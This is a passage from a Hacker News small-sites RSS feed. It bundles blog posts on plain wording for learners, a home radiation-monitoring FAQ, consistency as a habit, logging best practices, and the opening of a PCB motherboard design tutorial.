		<!-- .nav-links -->
	</nav><!-- .navigation -->
	
<!-- end related posts -->

<!-- #comments -->

		</main><!-- #main -->
	</div><!-- #primary -->
</div></div>]]>
            </description>
            <link>https://www.gamingalexandria.com/wp/2019/07/legend-of-zelda-development-files/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215892</guid>
            <pubDate>Sun, 21 Feb 2021 18:38:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make Your Writing More Approachable for Learners]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26215735">thread link</a>) | @mooreds
<br/>
February 21, 2021 | https://bphogan.com/2020/01/30/make-writing-more-approachable-for-learners/ | <a href="https://web.archive.org/web/*/https://bphogan.com/2020/01/30/make-writing-more-approachable-for-learners/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<main>

<article>
  <header>
    

    <p>Published January 30, 2020</p>

    <p>
      Reading time: 3 minutes.
    </p>
  </header>

  <section>
    <p>If you’re creating technical content in order to teach others, you might be tempted to use words like “easy”, “simple”, or “straightforward” because you want to put the learner at ease. Unfortunately, those words can have the opposite effect.</p>
<p>How “easy” something is depends on the learner’s frame of reference. It’s relative to their existing experiences. When a learner encounters something that they hear is easy, or simple, or straightforward, and they encounter a problem, they tend to internalize it; “This is easy… why am I struggling? I’m not cut out for this!” This cancels out all the good intentions you had.</p>
<p>When I’m editing a document, article, book, or script, I have a list of words and phrases that I try to eliminate right away. I call them “bad words”. Here are some of the words that tend to be demotivational.</p>
<ul>
<li>basically</li>
<li>easy</li>
<li>just</li>
<li>obvious</li>
<li>obviously</li>
<li>straightforward</li>
<li>simple</li>
<li>simply</li>
</ul>
<p>I flag these and remove them, as in most cases they’re not necessary. For example:</p>
<blockquote>
<p>Simply reboot the server.</p>
</blockquote>
<p>Remove “Simply” and the sentence loses no meaning and becomes tighter:</p>
<blockquote>
<p>Reboot the server.</p>
</blockquote>
<p>Sometimes I’ll ask the author to add the context that might be missing. A lot of times, authors are making assumptions about the experience the readers have. Consider this passage:</p>
<blockquote>
<p>Using Okta is a simple way to add authentication to your app. Just add it to your project. Much easier than writing your own authentication.</p>
</blockquote>
<p>If you look at the documentation for Okta, it’s anything but simple. And you don’t “just” add it to your project. You need an account. You need to create users. You need to import the appropriate libraries, and integrate the code into your codebase.</p>
<p>If you’ve done this a hundred times, you may indeed find this easy. As an author, you have to remember that you’re writing something like this to teach others. You want them to be successful. So you may have to share the details so the learner has the right frame of reference, and can make the call if it’s “easy” for themselves. Consider this version instead:</p>
<blockquote>
<p>Okta lets you add authentication to your app instead of writing your own logic, which will be more complicated and more prone to security vulnerabilities. In this tutorial you’ll sign up for an Okta account, obtain the API keys you need, create your users, and integrate Okta’s JavaScript code with your app.</p>
</blockquote>
<p>This version tells the reader what’s in store, including an explanation as to why Okta is a good choice over writing your own implementation.</p>
<p>Yes, it’s much more text. But readers can skip it. Assume your readers are as smart as you. Give them all the pieces and let them decide what’s easy, and what they can skip.</p>
<p>I suggest adding words like “easy”, “simple”, and others to your text editor’s spelling dictionary as misspelled words so they show up as you’re writing or editing.</p>
<p>You can also install plugins for your editor that focus on improving writing. The <a href="https://github.com/TravisTheTechie/vscode-write-good">write-good</a> plugin for Visual Studio Code is handy, and you can find similar plugins for <a href="https://github.com/davidbeckingsale/writegood.vim">Vim</a> and <a href="https://github.com/bnbeckwith/writegood-mode">Emacs</a>. These will find some of the words I listed, among other phrases and words that cause your writing to be weaker than it could be. Be warned though; these plugins have opinions of their own, and may ignore some words while flagging others. Tweak them to find what works best for your learners. After all, you’re writing for them, not just for yourself.</p>

  </section>

  <hr>
  
  
</article>


      </main>
      

</div></div>]]>
            </description>
            <link>https://bphogan.com/2020/01/30/make-writing-more-approachable-for-learners/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215735</guid>
            <pubDate>Sun, 21 Feb 2021 18:23:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Silicon Valley (and Montana) radiation levels]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26215730">thread link</a>) | @wglb
<br/>
February 21, 2021 | https://lcamtuf.coredump.cx/naer/ | <a href="https://web.archive.org/web/*/https://lcamtuf.coredump.cx/naer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
Sensor: LND 7121 G-M tube, gamma sensitivity (<sup>60</sup>Co) 18 cps/mR/hr, time-to-first-count circuit, usable range 1 µR/h - 600 R/h.
</p><div>

<tbody><tr>
<td><b>Q:</b></td>
<td><i>What am I looking at?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>The measurements of the dose rate in the San Francisco Bay Area in California, expressed in microröntgens per hour. The elevation is around 30 ft above sea level.
The setup is predominantly sensitive to gamma radiation and X-rays and is mounted in a wooden-frame utility space close to an exterior air vent. The chart is
updated every five minutes or so.

(There is a temporary gap in the monthly data prior to Feb 14 as the computer controlling the sensor suffered an SSD failure and had to be rebuilt.)
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>What's the red "Montana reference" line on the plots?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>For mildly amusing reasons, I also have access to data from an identical indoor sensor in Montana, at an elevation of about 3,500 feet above sea level.
I figured it may be an interesting comparison.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>But what does this mean?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
Depends, but most likely nothing.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>Gee, thanks a bunch. What's normal?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
The usual background levels at the Bay Area location appear to be around 8-9 µR/h. This is due to cosmic radiation, the decay of natural radioisotopes
in the soil, and various man-made releases over the past several decades. Modest excursions above this baseline (10% or so) typically have no discernible cause,
but sometimes are correlated with solar activity or winds from more radioactive parts of the world.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>Okay, what wouldn't be considered normal?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
Increases past 20 µR/h or so would be highly anomalous for this location, but not particularly bad for you. Ignoring some ongoing scientific controversy,
the effects of ionizing radiation appear to be roughly cumulative. The first statistically observable effect is a 0.6% increase in cancer risk with a lifetime
exposure to an extra dose of 10 röntgens (or more correctly, 100 millisieverts). At a dose rate of 20 µR/h (~0.2 µSv/h), it would take about
60 years to reach that threshold.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>Isn't an extra 0.6% cancer risk a pretty big deal?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
Your lifetime odds of developing cancer are already around 50%. Similarly to salt consumption risks, that extra 0.6% may be noteworthy across large
populations, and thus be of interest to public health - but it represents a negligible hazard on an individual basis.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>What readings would be truly dangerous, then?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
There is no simple answer; for example, radioisotopes that are absorbed by your body from food can be far more dangerous than ambient radiation levels, and the
meter doesn't check your diet. But an acute dose of 100 R (1 Sv) can cause mild radiation sickness; and even when received more slowly, it can
substantially increase your cancer risk (+6%). Acute exposure to 500 R (5 Sv) is often lethal.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>Wait a moment... why are Montana readings quite a bit higher than in California?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
SF Bay Area is a coastal region, while the other location is up in the mountains - which means that there is less atmosphere to
stop cosmic rays. If that freaks you out, consider that a commercial flight easily exposes you to about 300 µR/h!
</td>
</tr>


<tr>
<td><b>Q:</b></td>
<td><i>If there's ever a nuclear emergency, wouldn't I just want to die quickly anyway?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
Hey, it's your life, but probably not. Such events are a lot more survivable than portrayed in fiction - and more importantly,
the future that awaits the survivors is not necessarily all that bleak. You may want to check out a free book titled
<a href="http://oism.org/nwss/nwss.pdf"><i>"Nuclear War Survival Skills"</i></a>, published back in the good old days of the
Cold War. It sounds goofy, but it is a surprisingly
interesting read and it goes through some hard science to debunk many of the folksy beliefs perpetuated by Hollywood. And if you are interested in common-sense
preparedness strategies for more plausible risks, check out <a href="https://lcamtuf.coredump.cx/prep/">this guide</a>, too.
</td>
</tr>

<!--
<tr>
<td valign=top><b>Q:</b></td>
<td><i>If radiation can kill, why do they insist that microwaves and cell phones are safe?</td>
</tr>

<tr>
<td valign=top><b>A:</b></td>
<td class=answer>
Ionizing radiation involves particles so energetic that they routinely knock electrons out of the atoms they collide with.
That's enough to destroy all kinds of fragile organic molecules essential to life. We detect ionizing radiation
by measuring this very phenomenon in a sealed Geiger-M&uuml;ller tube containing a noble gas. 
In contrast, RF signals involve particles that are orders of magnitude less energetic even than the photons in
visible light. Neither visible light nor radio transmissions do anything interesting to a G-M tube. 
That's not to say that there aren't other ways for high-intensity RF or visible light to hurt you; for example,
a microwave can give you a nasty burn.
</td>
</tr>
-->

<tr>
<td><b>Q:</b></td>
<td><i>Why is the raw data so noisy?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
Radioactive decay is a stochastic process. The number of particles striking the detector is highly variable and needs to
be averaged over a longer period of time to get stable numbers and observe more subtle trends.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>What's the difference between röntgens (R) and sieverts (Sv), anyway?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
Röntgens measure exposure, sieverts try to take into account the effects of a received dose on the human body, depending
on the exact type of radiation in question. For gamma radiation, the ballpark conversion rate is 100 R = 1 Sv.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>What about websites like 
<a href="http://radiationnetwork.com/">RadiationNetwork.com</a>,
<a href="http://www.uradmonitor.com/">uRADMonitor.com</a>,
<a href="https://www.epa.gov/radnet/near-real-time-and-laboratory-data-state">RadNet</a>,
etc?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
They are cool, but many of them are closed platforms or have other issues - such as
very limited graphing / trend analysis, ambiguous units (CPM), etc. I figured that it
doesn't hurt to do this my way. I originally also included weather patterns in the charts,
but then Weather Underground discontinued their public API, so there's that.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>I want this. How do you have it set up?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
The meter is 
<a href="http://www.nukalert.com/index_b.html">NukAlert-ER</a>
 - a relatively fancy, wide-range time-to-first-count device based on 
<a href="https://www.lndinc.com/products/geiger-mueller-tubes/712-2/">LND 7121</a>; it is hard to find these
days and I had to hand-craft a 
<a href="https://lcamtuf.coredump.cx/soft/read_naer.c">Linux driver</a> for it. More accessible choices include
cheap but narrow-range USB meters, such as 
<a href="https://smile.amazon.com/dp/B00YQARZ5S/">Radex One</a> or
<a href="https://smile.amazon.com/dp/B00I8GQ1EC/">GMC-320Plus</a> ($100);
MCU-based hacks to intercept readings on the HD44780 bus of wide-range 
Canberra ADM-300 units that are currently abundant on eBay but have no USB port ($200);
or DIY circuits with cheap Soviet SBM-20 or STS-5 tubes (sub-$40, but
not truly calibrated). The Geiger counter
aside, the remaining components used to be a collection of cron jobs to fetch solar X-ray flux
readings from NOAA, query the <i>wunderground.com</i> API for weather data, and then to draw all the charts using
<i>gnuplot</i>; that said, both of these APIs are now defunct.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>On a related note, can you recommend any home decor accessories?</i></td>
</tr>

<tr>
<td><b>A:</b></td>
<td>
Yes, of course. Check out <a href="https://lcamtuf.coredump.cx/geiger/">this page</a> for more.
</td>
</tr>

<tr>
<td><b>Q:</b></td>
<td><i>Who are you?</i></td>

</tr><tr>
<td><b>A:</b></td>
<td>
You can reach me at <a href="mailto:lcamtuf@coredump.cx">lcamtuf@coredump.cx</a>.
By the way, your lucky number is: 20504567.
</td>
</tr>

</tbody></div></div>]]>
            </description>
            <link>https://lcamtuf.coredump.cx/naer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215730</guid>
            <pubDate>Sun, 21 Feb 2021 18:22:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Consistency as a Moat]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26215532">thread link</a>) | @r0rshrk
<br/>
February 21, 2021 | https://thewriting.dev/p/consistency-as-a-moat | <a href="https://web.archive.org/web/*/https://thewriting.dev/p/consistency-as-a-moat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5aa22e50-5c3a-48c6-b8d1-99090780e768_6016x4016.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F5aa22e50-5c3a-48c6-b8d1-99090780e768_6016x4016.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/5aa22e50-5c3a-48c6-b8d1-99090780e768_6016x4016.jpeg&quot;,&quot;height&quot;:972,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:4127278,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>I have a theory, the most sure-fire way to be good at something is to be consistent at it. And the more you are consistent with something the larger gap that you create between you and your competitors. Everyone who you know is good at something(X) as probably been doing X, or a version of X for more than a while now.</p><p>But, you may ask, how to be consistent when the end goal is large or the task itself is large? The solution is to break down your goal into clearly defined &amp; atomic tasks, and repeating an even more reduced version of that task for everyday, till you make progress on your goal. Mike Critter explains it on his blog here, "<a href="https://critter.blog/2021/02/01/tiny-habits-no-like-tiny-tiny/">Tiny habits. No, like TINY tiny.</a>"</p><p>And, which set of tasks from these should you be practicing at a time? The ones you're bad (relatively worse) at. Taking this from the essay on <a href="https://jamesclear.com/deliberate-practice-theory">deliberate practise</a>, the best way to optimise consistency is to prioritize the things which you're worse at, or where you can have improvement.</p><p>Breaking this down for myself, let's take the example of the act of writing itself. I started writing by publishing larger articles to publications. These used to be code-heavy articles and so used to take 1-2 months to write, edit and publish. However, I figured out rather than writing for someone else I wanted to write to grow my own audience.</p><p>The first problem was that writing articles weekly was difficult for me. So, I initially started with writing an article every 2 weeks, I could pick up ideas throughout the week, experiment with them a bit and then write at the end of 2 weeks.</p><p>However, for a newsletter (which is what I'm aiming at growing), a weekly model makes more sense to keep your readers engaged, and also keep your writing muscles trained. My problem with writing weekly was that I couldn't find the words to think about at the end of the week, when you are generally in a relaxed mood and might only be in the mood of chilling. (There are benefits of not ending your week with "nothing", as explained by <a href="https://training.kalzumeus.com/newsletters/archive/do-not-end-the-week-with-nothing">patio11 here</a>.)</p><p>So, to break this habit down, I currently write only 200 words everyday. This is a tiny enough habit that by the time I'm done with 200 words, I already have the next 200 words thought of, and they just flow onto the page.</p><p>I also automatically stopped procrastinating when I tried to achieve <strong>only the bare minimum</strong> everyday. (The other way to stop procrastinating is turning off the internet, which no-one tells you about. - <a href="http://twitter.com/hipreetam93">@hipreetam93</a>)</p><p>And so, that's how I'm applying consistency for writing.</p><p>How is it a moat? Just look at everyone you admire, or look at the people who're good in a field, and research their history :)</p><p>Anyways, go out there, make mistakes of ambitions not of sloth, and finish your damn business EVERY SINGLE DAY.</p></div></div>]]>
            </description>
            <link>https://thewriting.dev/p/consistency-as-a-moat</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215532</guid>
            <pubDate>Sun, 21 Feb 2021 17:59:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Logging Best Practices]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26215501">thread link</a>) | @r_singh
<br/>
February 21, 2021 | https://tuhrig.de/my-logging-best-practices/ | <a href="https://web.archive.org/web/*/https://tuhrig.de/my-logging-best-practices/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainContentOfPage">
		<p>If you are a backend developer like me, logging is the window to your application. Unlike in the frontend, there’s not much to see except from some logging messages. Here are some of my personal guidelines I use when I write logs.</p>

<p>Back in the days, a logbook was written on every ship. It was like a diary which recorded important events throughout the day. And just like a traditional logbook, we should log things that had happened instead of things we are going to do.</p>
<p>Let’s make an example:</p>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6036b78d0d681554082638" data-settings=" minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>// don't do that</span></p><p><span>log</span><span>.</span><span>info</span><span>(</span><span>"Making request to REST API"</span><span>)</span></p><p><span>restClient</span><span>.</span><span>makeRequest</span><span>(</span><span>)</span></p><p><span>// do that</span></p><p><span>restClient</span><span>.</span><span>makeRequest</span><span>(</span><span>)</span></p><p><span>log</span><span>.</span><span>info</span><span>(</span><span>"Made request to REST API"</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->

<p>The first log statement doesn’t tell much. When reading it, you will not know if the REST call was successful or not. To do so you must look for the absence of an exception. And if you read this log but miss the subsequent exception you will be confused for the rest of the day (trust me).</p>
<p>The second log is much better. It clearly states that the operation right before was successful. If the REST call would have failed, you would not see this log – there would be an exception instead.</p>
<p>I apply this rule to all INFO logs. However I make exceptions for DEBUG.</p>

<p>A typical log message contains two types of data. One type is a handwritten message which states was is going on. The second type is a list of (technical) parameters involved in the operation. You should try to separate both parts.</p>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6036b78d0d68d727027651" data-settings=" minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>// don't do that</span></p><p><span>restClient</span><span>.</span><span>makeRequest</span><span>(</span><span>)</span></p><p><span>log</span><span>.</span><span>info</span><span>(</span><span>"Made request to {} on REST API."</span><span>,</span><span> </span><span>url</span><span>)</span></p><p><span>// do that</span></p><p><span>restClient</span><span>.</span><span>makeRequest</span><span>(</span><span>)</span></p><p><span>log</span><span>.</span><span>info</span><span>(</span><span>"Made request to REST API. [url={}]"</span><span>,</span><span> </span><span>url</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->

<p>The first log message has some flaws. It’s difficult to parse for example for Grok patterns. So it becomes harder to automatically extract IDs or parameters in our logging tool. It’s also difficult to read. Imagine having a very long URL possibly with a list of parameters at their end. Half of the log message might be out of your screen. And of course, the message is more difficult to extend. If you want to add another parameter (such as the HTTP method used) you must rewrite you whole sentence.</p>
<p>The seconds version has none of these flaws. It’s easy to parse because the parameter list has a clear syntax. It’s easy to read, as you can see the sentence right up-front. And it’s easy to extend as you can just add another parameter to the list.</p>

<p>Obviously, log levels are there for a reason and you should use them appropriately. And there are some key differences between a WARNING and an ERROR. </p>
<p>If you did some operations which actually worked, but there have been some issues – that’s a WARNING. But if you did some operation and it simply didn’t work – that’s an ERROR.</p>
<p>Let’s look at an example again:</p>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6036b78d0d692786964744" data-settings=" minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>try</span><span> </span><span>{</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>restClient</span><span>.</span><span>makeRequest</span><span>(</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>log</span><span>.</span><span>info</span><span>(</span><span>"Made request to REST API. [url={}]"</span><span>,</span><span> </span><span>url</span><span>)</span></p><p><span>}</span><span> </span><span>catch</span><span>(</span><span>e</span><span>:</span><span> </span><span>UnauthorizedException</span><span>)</span><span> </span><span>{</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>log</span><span>.</span><span>warn</span><span>(</span><span>"Request to REST API was rejected because user is unauthorized. [url={}, result={}]"</span><span>,</span><span> </span><span>url</span><span>,</span><span> </span><span>result</span><span>)</span></p><p><span>}</span><span> </span><span>catch</span><span>(</span><span>e</span><span>:</span><span> </span><span>Exception</span><span>)</span><span> </span><span>{</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>log</span><span>.</span><span>error</span><span>(</span><span>"Request to REST API failed. [url={}, exception={}]"</span><span>,</span><span> </span><span>url</span><span>,</span><span> </span><span>exception</span><span>)</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->

<p>The REST call might have one of three outcomes:</p>
<ul>
<li>It can work like a charm. That’s an INFO (<em>after</em> the call).</li>
<li>It can fail with an unexpected exception. That’s an ERROR (<em>instead</em> of the INFO log).</li>
<li>It can result in some expected exception. That’s a WARNING.</li>
</ul>
<p>So in case of a WARNING, you did something, but you didn’t do it perfectly. In case of an ERROR you didn’t do it.</p>
<p>Also note that a WARNING (and also an ERROR of course) is a call to action. If nobody needs to react and to do something, then you don’t need to log a WARNING. </p>

<p>The INFO log should look like a book. It should tell you what had happened, not necessarily how. This means that INFO is better suited for business-like log messages compared to technical stuff. Technical related messages should (usually) be DEBUG.</p>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6036b78d0d696381712437" data-settings=" minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>INFO</span><span>&nbsp;&nbsp;</span><span>|</span><span> </span><span>User </span><span>registered </span><span>for</span><span> </span><span>newsletter</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>,</span><span> </span><span>email</span><span>=</span><span>"thomas@tuhrig.de"</span><span>]</span></p><p><span>INFO</span><span>&nbsp;&nbsp;</span><span>|</span><span> </span><span>Newsletter </span><span>send </span><span>to</span><span> </span><span>user</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>]</span></p><p><span>INFO</span><span>&nbsp;&nbsp;</span><span>|</span><span> </span><span>User </span><span>unsubscribed </span><span>from </span><span>newsletter</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>,</span><span> </span><span>email</span><span>=</span><span>"thomas@tuhrig.de"</span><span>]</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0010 seconds] -->

<p>This type of log tells you a story from the point of view of our business. Now what are technical logs?</p>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6036b78d0d699386815407" data-settings=" minimize scroll-mouseover">
		
			
			<div>
				<table>
					<tbody><tr>
				<td data-settings="hide">
					
				</td>
						<td><div><p><span>DEBUG</span><span> </span><span>|</span><span> </span><span>Saved </span><span>user </span><span>to</span><span> </span><span>newsletter </span><span>list</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>,</span><span> </span><span>email</span><span>=</span><span>"thomas@tuhrig.de"</span><span>]</span></p><p><span>DEBUG</span><span> </span><span>|</span><span> </span><span>Send </span><span>welcome </span><span>mail</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>,</span><span> </span><span>email</span><span>=</span><span>"thomas@tuhrig.de"</span><span>]</span></p><p><span>INFO</span><span>&nbsp;&nbsp;</span><span>|</span><span> </span><span>User </span><span>registered </span><span>for</span><span> </span><span>newsletter</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>,</span><span> </span><span>email</span><span>=</span><span>"thomas@tuhrig.de"</span><span>]</span></p><p><span>DEBUG</span><span> </span><span>|</span><span> </span><span>Started </span><span>cron </span><span>job </span><span>to</span><span> </span><span>send </span><span>newsletter </span><span>of </span><span>the </span><span>day</span><span>.</span><span> </span><span>[</span><span>subscribers</span><span>=</span><span>24332</span><span>]</span></p><p><span>INFO</span><span>&nbsp;&nbsp;</span><span>|</span><span> </span><span>Newsletter </span><span>send </span><span>to</span><span> </span><span>user</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>]</span></p><p><span>INFO</span><span>&nbsp;&nbsp;</span><span>|</span><span> </span><span>User </span><span>unsubscribed </span><span>from </span><span>newsletter</span><span>.</span><span> </span><span>[</span><span>user</span><span>=</span><span>"Thomas"</span><span>,</span><span> </span><span>email</span><span>=</span><span>"thomas@tuhrig.de"</span><span>]</span></p></div></td>
					</tr>
				</tbody></table>
			</div>
		</div>
<!-- [Format Time: 0.0020 seconds] -->

<p>Every (business) use-case results in a single line of INFO log. Additionally, there are DEBUG logs which give a more detailed insight in how the process works.</p>

<p>Of course, there’s much more to do for good logs. You also need to consider things like tracing, log aggregation and metrics. But when it comes down to the pure writing, I really recommend those little rules.</p>
<p><b>Best regards,</b><br>
Thomas</p>


		
									</div></div>]]>
            </description>
            <link>https://tuhrig.de/my-logging-best-practices/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26215501</guid>
            <pubDate>Sun, 21 Feb 2021 17:56:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to design a motherboard for your electronics project]]>
            </title>
            <description>
<![CDATA[
Score 59 | Comments 14 (<a href="https://news.ycombinator.com/item?id=26215270">thread link</a>) | @frenchie4111
<br/>
February 21, 2021 | https://www.staycaffeinated.com/2021/02/21/how-to-design-a-motherboard-for-your-project-part-1 | <a href="https://web.archive.org/web/*/https://www.staycaffeinated.com/2021/02/21/how-to-design-a-motherboard-for-your-project-part-1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content_area">
    <div>
        
            
        

        
             <h2>-1. Overview</h2>
<p> After the prototyping phase of any electronics project, I like to make a "Motherboard" PCB. For this phase I will continue to use breakout boards for all of the individual components, but link them together using a PCB. This allows the PCB design to stay simple and flexible, and makes them easy to hand manufacture them in my workshop. This is a great setup if you want to do a small (10ish) beta run of your project before designing a full product. I have shipped many hardware products using this stage, it's a great way to validate your MVP before putting money into tooling and CM bring up. </p> <p> This tutorial will walk through the process that I follow to create a motherboard. The intended audience is someone who has already wired up a prototype on a breadboard, and wants to get started bundling them together into a motherboard. This will be the guide I wish existed when I got started doing this. </p>
 <p><img src="https://d33wubrfki0l68.cloudfront.net/4018eef6e0333515d064a35fe2336c2858a216c3/83757/images/how-to-pcb-part-1/thermostat-motherboard.jpeg"></p><p>Here is an example of the motherboard I designed for my <a href="https://www.staycaffeinated.com/caffstat_beta">Thermostat</a> project </p>
<p> This is just the process I figured out for myself, it's by no means perfect. If you have any feedback or questions about any of this stuff, want a PCB design for your project, or just want to chat, feel free to reach out to me: mdl0394@gmail.com </p>
<p> This is Part 1 of the guide. In this guide we will go through initial setup, component model sourcing and schematic design. In Part 2 we will go through board layout and ordering PCBs. If you want to be notified when Part 2 comes out, sign up for email notifications, or subscribe to the RSS feed. </p> 
            <div>
    <p>

    Thanks for reading! If you want to stay updated feel free to follow the <a href="https://staycaffeinated.com/feed.xml">RSS feed</a>, if you have any suggestions feel free to email me at <a href="mailto:mdl0394@gmail.com">mdl0394@gmail.com</a></p><p>
    

    You could also submit your email here, and I will personally email you whenever I post new things:

    </p>
</div>

        

        <h2>Table of Contents</h2>
        <ul><li><a href="#0-before-you-build-a-pcb">0. Before you build a PCB</a><ul><li><a href="#01-installing-eagle">0.1 Installing Eagle</a></li></ul></li><li><a href="#1-anatomy-of-a-pcb-design">1. Anatomy of a PCB Design</a></li><li><a href="#2-finding-or-creating-component-models">2. Finding or Creating Component Models</a><ul><li><a href="#21-octopart">2.1. Octopart</a></li><li><a href="#22-desparate-googling">2.2. Desparate Googling</a></li><li><a href="#23-installing-a-library">2.3. Installing a library</a></li><li><a href="#24-creating-your-own-library">2.4. Creating your own Library</a></li></ul></li><li><a href="#3-creating-your-schematic">3. Creating your Schematic</a><ul><li><a href="#31-basic-project-setup">3.1. Basic Project Setup</a></li><li><a href="#32-place-your-components">3.2. Place your components</a></li><li><a href="#33-placing-the-ground-label">3.3. Placing the Ground Label</a></li></ul></li><li><a href="#34-wiring-using-labels">3.4. Wiring using Labels</a><ul><li><a href="#35-reviewing-your-schematic">3.5. Reviewing your Schematic</a></li></ul></li><li><a href="#40-part-2-board-layout---coming-soon">4.0 Part 2 (Board Layout) - Coming Soon</a></li></ul>


        <h2 id="0-before-you-build-a-pcb">0. Before you build a PCB</h2>

<p>Before you build a PCB you should already have all of the breakout boards &amp; devkits you want to use for the project. When designing the motherboard you should already have a good understanding of how the electronics components are wired together, if you donâ€™t itâ€™s easy to make costly mistakes.</p>

<p>For this project I will be using my Caffstat (Hackable Smart Home Thermostat) project. If you are interested in a smart home thermostat feel free to check out that <a href="https://www.staycaffeinated.com/caffstat_beta">project here</a>.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7eacc185287abd48aa4bca8d5f02bff250b987d9/def8e/images/how-to-pcb-part-1/untitled.png" alt="https://d33wubrfki0l68.cloudfront.net/7eacc185287abd48aa4bca8d5f02bff250b987d9/def8e/images/how-to-pcb-part-1/untitled.png">
